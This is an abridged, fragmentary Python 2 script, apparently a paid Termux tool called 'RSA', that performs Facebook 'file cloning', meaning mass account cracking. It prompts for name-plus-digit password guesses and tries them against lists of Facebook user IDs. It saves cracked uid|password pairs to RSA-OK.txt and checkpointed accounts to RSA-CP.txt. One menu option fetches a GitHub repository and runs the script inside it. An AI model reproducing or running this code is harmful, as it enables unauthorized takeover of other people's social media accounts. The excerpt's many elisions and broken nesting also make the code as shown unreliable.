...
def dasnumber():
    ...
    print ''
    print '[1] File Cloning \x1b[1;91m(new)\x1b[1;92m(8)\x1b[1;97m(mix)\x1b[1;97m'
    print '[0] Back'
    print ''
    os.system('echo -e "-----------------------------------------------"  | lolcat  -a -d 20 -s 10000')
    pop()
...
def lasm():
    ...
    print ''
    try:
        tok = open('/data/data/com.termux/abmkimakichuth.txt', 'r').read()
        dec = base64.b64decode(tok)
        if len(dec) < 44:
            not_reg()
        r = requests.get('https://raw.githubusercontent.com/abmkibajikolan.txt').text
        if dec in r:
            o()
        else:
            logo()
            ...
            print ' Admin WhatsApp : +1 302-595-7334'
            print 47 * '-'
            print ''
            print '\x1b[1;97m'
            print ''
            ...
            os.system('xdg-open https://wa.me/+0013025957334')
            oa()
    except IOError:
        p()
...
def lo():
    ...
    print ''
    try:
        tok = open('/data/data/com.termux/files/abmkibhenkolan.txt', 'r').read()
        dec = base64.b64decode(tok)
        if len(dec) < 44:
            not_reg()
        r = requests.get('https://raw.githubusercontent.com/abmdanha.txt').text
        if dec in r:
            menu()
        else:
            logo()
...
def menu():
    os.system('clear')
    logo()
    os.system('echo -e " ( Watu Izzu Man Tasha Watu Zillu Man Tasha )"  | lolcat  -a -d 20 -s 10')
    print ''
    os.system('echo -e "-----------------------------------------------"  | lolcat  -a -d 20 -s 10000')
    print '        Author : Rana Aahil'
    print '        Github : github.com/rsaprogrammer'
    print '        Admins :    (RSA-Programmers)'
    os.system('echo -e "-----------------------------------------------"  | lolcat  -a -d 20 -s 10000')
    print ''
    print ''
    print ''
    os.system('echo -e "\n\t WITHOUT TOKEN COMMANDS"  | lolcat  -a -d 20 -s 10000')
    print ''
    os.system('echo -e "-----------------------------------------------"  | lolcat  -a -d 20 -s 10000')
    print ''
    print '[1] File Cloning \x1b[1;92m(6)\x1b[1;97m(digit)\x1b[1;97m'
    print '[2] File Cloning \x1b[1;92m(6)\x1b[1;97m(pass)\x1b[1;97m'
    print '[3] File Cloning \x1b[1;92m(8)\x1b[1;97m(mix)\x1b[1;97m'
    print '[4] Start RSA Main \x1b[1;91m(Login Extracting)\x1b[1;97m'
    print '[0] Exit'
    print ''
    os.system('echo -e "-----------------------------------------------"  | lolcat  -a -d 20 -s 10000')
    tt()
...
def n_ss():
    ...
    cps = []
    oks = []
    n_ss = raw_input('Select :')
    if n_ss == '78778':
        os.system('clear')
        print logo
        print '\x1b[1;95m~~~~ Name + Digit Pass Public Crack ~~~~\x1b[1;91m'
        print 47 * '-'
        print '\x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
        print 47 * '-'
        p1 = raw_input(' \x1b[1;92m[1]Name + digit:\x1b[1;91m ')
        p2 = raw_input(' \x1b[1;92m[2]Name + digit:\x1b[1;91m ')
        p3 = raw_input(' \x1b[1;92m[3]Name + digit:\x1b[1;91m ')
        p4 = raw_input(' \x1b[1;92m[4]Name + digit:\x1b[1;91m ')
        p5 = raw_input(' \x1b[1;92m[5]Name + digit:\x1b[1;91m ')
        p6 = raw_input(' \x1b[1;92m[6]Name + digit:\x1b[1;91m ')
        ...
        try:
            ...
            os.system('clear')
            print logo
            print '\x1b[1;95m~~~~Name + Digit Pass Public Crack~~~~'
        ...
        os.system('clear')
        print logo
        print '\x1b[1;95m~~~~ Name pass followers crack ~~~~\x1b[1;91m'
        print 47 * '-'
        ...
        try:
            ...
            os.system('clear')
            print logo
            print '\x1b[1;95m~~~~ Name pass followers crack ~~~~'
            print ' \x1b[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input('\x1b[1;92mPress enter to try again ')
        ...
        logo()
        print '\x1b[1;97m'
        p1 = raw_input(' \x1b[1;97m[1]Name + digit:\x1b[1;91m ')
        p2 = raw_input(' \x1b[1;97m[2]Name + digit:\x1b[1;91m ')
        p3 = raw_input(' \x1b[1;97m[3]Name + digit:\x1b[1;91m ')
        p4 = raw_input(' \x1b[1;97m[4]Name + digit:\x1b[1;91m ')
        p5 = raw_input(' \x1b[1;97m[5]Name + digit:\x1b[1;91m ')
        p6 = raw_input(' \x1b[1;97m[6]Name + digit:\x1b[1;91m ')
        try:
    ...
    time.sleep(0.5)
    os.system('echo -e "-----------------------------------------------"  | lolcat  -a -d 20 -s 10000')
    os.system('echo -e "    (**) Cloning Start Please Wait (**)"  | lolcat  -a -d 20 -s 10000')
    os.system('echo -e "-----------------------------------------------"  | lolcat  -a -d 20 -s 10000')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;32m[RSA-OK] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/RSA-CLONING/RSA-OK.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;37m[RSA-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('/sdcard/RSA-CLONING/RSA-CP.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;32m[RSA-OK] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/RSA-CLONING/RSA-OK.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;37m[RSA-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('/sdcard/RSA-CLONING/RSA-CP.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'access_token' in q:
                        print '\x1b[1;32m[RSA-OK] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/RSA-CLONING/RSA-OK.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;37m[RSA-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('/sdcard/RSA-CLONING/RSA-CP.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'access_token' in q:
                            print '\x1b[1;32m[RSA-OK] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/RSA-CLONING/RSA-OK.txt', 'a')
                            ok.write(uid + '|' + pass4 + '\n')
                            ok.close()
                            ...
                            if 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;37m[RSA-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                                cp = open('/sdcard/RSA-CLONING/RSA-CP.txt', 'a')
                                cp.write(uid + '|' + pass4 + '\n')
                                cp.close()
                            ...
                            q = json.loads(data)
                            if 'access_token' in q:
                                print '\x1b[1;32m[RSA-OK] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/RSA-CLONING/RSA-OK.txt', 'a')
                                ok.write(uid + '|' + pass5 + '\n')
                                ok.close()
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;37m[RSA-CP] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                    cp = open('/sdcard/RSA-CLONING/RSA-CP.txt', 'a')
                                    cp.write(uid + '|' + pass5 + '\n')
                                    cp.close()
                                ...
                                q = json.loads(data)
                                if 'access_token' in q:
                                    print '\x1b[1;32m[RSA-OK] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/RSA-CLONING/RSA-OK.txt', 'a')
                                    ok.write(uid + '|' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;37m[RSA-CP] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    cp = open('/sdcard/RSA-CLONING/RSA-CP.txt', 'a')
                                    cp.write(uid + '|' + pass6 + '\n')
                                    cp.close()
...
def nawi_cloning():
    ...
    os.system('echo -e "-----------------------------------------------"  | lolcat  -a -d 20 -s 10000')
    print ''
    print '[1] File Cloning \x1b[1;91m(new)\x1b[1;92m(6)\x1b[1;97m(digit)\x1b[1;97m '
    print '[0] Back'
    print ''
    os.system('echo -e "-----------------------------------------------"  | lolcat  -a -d 20 -s 10000')
    n_ss()
...
def not_reg():
    ...
    v_token_save = open('/data/data/com.termux/files/home/.xxx.txt', 'w')
...
def o():
    ...
    print ' If You want To Buy Subscription Press Enter'
    print ' Subscription Charges (350rs)'
    print ' Admin WhatsApp : +1 348-020-4796'
    print 47 * '-'
    print ''
    print '\x1b[1;97m'
    print ''
...
def pop():
    ...
    if pop == '78778':
        ...
        p3 = raw_input(' \x1b[1;92m[3]Name + digit:\x1b[1;91m ')
        p4 = raw_input(' \x1b[1;92m[4]Name + digit:\x1b[1;91m ')
        pass5 = raw_input(' \x1b[1;92m[5]Password:\x1b[1;91m ')
        pass6 = raw_input(' \x1b[1;92m[6]Password:\x1b[1;91m ')
        pass7 = raw_input(' \x1b[1;92m[7]Password:\x1b[1;91m ')
        pass8 = raw_input(' \x1b[1;92m[8]Password:\x1b[1;91m ')
        idt = raw_input(' \x1b[1;96m[\xe2\x98\x85]Enter id: \x1b[0;97m ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
                        ...
                        if 'access_token' in q:
                            ...
                            if 'access_token' in q:
                                ...
                                if 'access_token' in q:
                                    ...
                                    q = json.loads(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;32m[RSA-OK] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('/sdcard/RSA-CLONING/RSA-OK.txt', 'a')
                                        ok.write(uid + '|' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;37m[RSA-CP] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        cp = open('/sdcard/RSA-CLONING/RSA-CP.txt', 'a')
                                        cp.write(uid + '|' + pass7 + '\n')
                                        cp.close()
                                        ...
                                        q = json.loads(data)
                                        if 'access_token' in q:
                                            print '\x1b[1;32m[RSA-OK] ' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('/sdcard/RSA-CLONING/RSA-OK.txt', 'a')
                                            ok.write(uid + '|' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[1;37m[RSA-CP] ' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            cp = open('/sdcard/RSA-CLONING/RSA-CP.txt', 'a')
                                            cp.write(uid + '|' + pass8 + '\n')
                                            cp.close()
...
def tt():
    ...
    if a == '1':
        ...
        print '\x1b[1;92m'
        print 'Executeing Script'
        print ''
        print ''
        os.system('rm -rf rsa')
        os.system('git clone https://github.com/RSAPROGRAMMER/rsa')
        os.system('cd rsa && python2 rsa.py')
    elif a == '0':
        print 'Good Byee'
    else:
